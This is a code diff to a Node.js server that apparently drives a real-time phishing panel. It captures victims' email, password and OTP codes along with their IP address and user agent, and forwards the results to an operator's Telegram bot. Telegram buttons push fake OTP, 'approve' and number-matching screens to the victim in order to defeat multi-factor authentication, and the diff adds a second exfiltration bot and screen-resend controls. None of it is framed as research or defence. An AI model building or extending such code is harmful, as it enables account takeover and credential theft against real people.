@@ -7,6 +7,8 @@ dotenv.config();
 const cors = require('cors');
 
 const app = express();
+app.use(express.urlencoded({ extended: true }));
+app.use(express.json());
 const server = http.createServer(app);
 const io = socketIo(server, {
   cors: {
@@ -21,8 +23,15 @@ app.use(express.json());
 
 // Telegram Bot Configuration
 const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
+const TELEGRAM_BOT2_TOKEN = process.env.TELEGRAM_BOT2_TOKEN;
 const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 const bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { 
+  polling: true,
+   request: {
+    timeout: 30000  // 30 seconds timeout instead of default
+  } 
+}); 
+const bot2 = new TelegramBot(TELEGRAM_BOT2_TOKEN, { 
   polling: true,
    request: {
     timeout: 30000  // 30 seconds timeout instead of default
@@ -44,10 +53,32 @@ const sessions = new Map();
 
 function generateUniqueId() {
   return Math.random().toString(36).substr(2, 9) + Date.now().toString(36);
-}
+} 
 
 
-// Socket.io connection
+// -------------------- Express route --------------------
+app.post('/start-session', (req, res) => {
+  const { sessionId } = req.body; // get sessionId from client
+  const session = sessions.get(sessionId);
+
+  if (!session) return res.status(404).send('Session not found');
+
+  session.ip =
+    req.headers['x-forwarded-for']?.split(',')[0] ||
+    req.socket.remoteAddress;
+
+  session.userAgent = req.headers['user-agent'];
+  session.socketId = req.body.socketId; // update socketId
+
+  console.log(`Session ${sessionId} started with IP: ${session.ip} and User Agent: ${session.userAgent}`);
+
+  res.send('ok');
+});
+
+
+
+
+// -------------------- Socket.io connection --------------------
 io.on('connection', (socket) => {
   console.log('New client connected:', socket.id);
   const sessionId = generateUniqueId();   
@@ -63,13 +94,19 @@ io.on('connection', (socket) => {
     password: null,
     otp: null,
     timestamp: new Date()
-  });  
+  });    
 
    socket.on('reconnect-session', (data) => {
     const session = sessions.get(data.sessionId);
     if (session) {
       console.log(`Updating socket for session ${data.sessionId}: ${session.socketId} → ${socket.id}`);
       session.socketId = socket.id; // Update to new socket ID
+    }  else {
+      console.log(`Session ${data.sessionId} not found for reconnection.`); 
+    // Session doesn't exist! Server must have restarted
+    // Tell frontend to reset and start fresh
+    socket.emit('session-invalid');
+    return; 
     }
   }); 
 
@@ -180,7 +217,8 @@ io.on('connection', (socket) => {
       await bot.sendMessage(TELEGRAM_CHAT_ID, message, {
         parse_mode: 'Markdown',
         reply_markup: keyboard
-      });
+      }); 
+      session.otp = data.otp; // Store OTP in session
     } catch (error) {
       console.error('Telegram error:', error);
     }
@@ -254,7 +292,11 @@ bot.on('callback_query', async (callbackQuery) => {
     
 
      case 'send_approve': {   
-      await bot.answerCallbackQuery(callbackQuery.id);
+      await bot.answerCallbackQuery(callbackQuery.id); 
+       await bot.editMessageReplyMarkup({ inline_keyboard: [] }, {
+      chat_id: chatId,
+      message_id: messageId
+    });
       socket.emit('show-approve-screen');
       await bot.sendMessage(chatId, '✅ Sent Approve screen to user'); 
       break;
@@ -263,6 +305,10 @@ bot.on('callback_query', async (callbackQuery) => {
 
         case 'send_approve_with_number': {   
       await bot.answerCallbackQuery(callbackQuery.id);
+       await bot.editMessageReplyMarkup({ inline_keyboard: [] }, {
+      chat_id: chatId,
+      message_id: messageId
+    });
       await bot.sendMessage(chatId, '🔢 Enter the special number to send (1-99):');
       
       // Wait for the number input
@@ -298,33 +344,76 @@ bot.on('callback_query', async (callbackQuery) => {
       message_id: messageId
     });
     const session = sessions.get(sessionId);
-    const summary = `✅ *Session Completed*\n\n` +
-      `*Provider:* ${session.provider}\n` +
-      `*Email:* ${session.email}\n` +
-      `*Password:* \`${session.password}\`\n` +
-      `*OTP:* ${session.otp || 'N/A'}\n` +
-      `*Time:* ${new Date().toLocaleString()}`;
-    await bot.sendMessage(TELEGRAM_CHAT_ID, summary, { parse_mode: 'Markdown' });
+   const summary = `✅ *Session Completed*\n` +
+                `\`=== ${session.provider} ===\`\n\n` +
+                `*Provider:* ${session.provider}\n` +
+                `*Email:* ${session.email}\n` + 
+                `*Password:* ${session.password || 'N/A'}\n` +
+                `*IP Address:* ${session.ip || 'N/A'}\n` +
+                `*USER AGENT:* ${session.userAgent || 'N/A'}\n` + 
+                `*Time:* ${new Date().toLocaleString()}`; 
+    await bot2.sendMessage(TELEGRAM_CHAT_ID, summary, { parse_mode: 'Markdown' });
     break;
   }
 
 
-    case 'request_again': {
-    const session = sessions.get(sessionId); 
-  if (session && session.specialNumber) { 
-    socket.emit('show-approve-with-number', { number: session.specialNumber });
-    await bot.answerCallbackQuery(callbackQuery.id, {
-      text: `🔄 approve screen with special number ${session.specialNumber} shown again`
-    });
-  } else {
-    // Normal OTP, show normal screen
-    socket.emit('show-approve-screen');
-    await bot.answerCallbackQuery(callbackQuery.id, {
-      text: '🔄 Approve screen shown again'
-    });
-  }
+
+   case 'request_again': {
+  await bot.answerCallbackQuery(callbackQuery.id);
+  
+  // Ask which screen to show
+  const keyboard = {
+    inline_keyboard: [
+      [
+        { text: '🔢 OTP Screen', callback_data: `resend_otp_${sessionId}` }
+      ],
+      [
+        { text: '✅ Approve Screen', callback_data: `resend_approve_${sessionId}` }
+      ],
+      [
+        { text: '🔢 Approve with Number', callback_data: `resend_approve_number_${sessionId}` }
+      ]
+    ]
+  };
+  
+  await bot.sendMessage(chatId, '🔄 Which screen do you want to show again?', {
+    reply_markup: keyboard
+  });
   break;
-   }
+} 
+
+
+case 'resend_otp': {
+  socket.emit('show-otp-screen');
+  await bot.answerCallbackQuery(callbackQuery.id, {
+    text: '✅ OTP screen sent again'
+  });
+  break;
+}
+
+case 'resend_approve': {
+  socket.emit('show-approve-screen');
+  await bot.answerCallbackQuery(callbackQuery.id, {
+    text: '✅ Approve screen sent again'
+  });
+  break;
+}
+
+case 'resend_approve_number': {
+  await bot.answerCallbackQuery(callbackQuery.id);
+  await bot.sendMessage(chatId, '🔢 Enter the special number to send (1-99):');
+  
+  bot.once('message', async (msg) => {
+    if (msg.chat.id === chatId) {
+      const specialNumber = msg.text;
+      socket.emit('show-approve-with-number', { number: specialNumber });
+      await bot.sendMessage(chatId, `✅ Sent approve screen with number: ${specialNumber}`);
+    }
+  });
+  break;
+}
+
+
 
 
     case 'reject': {
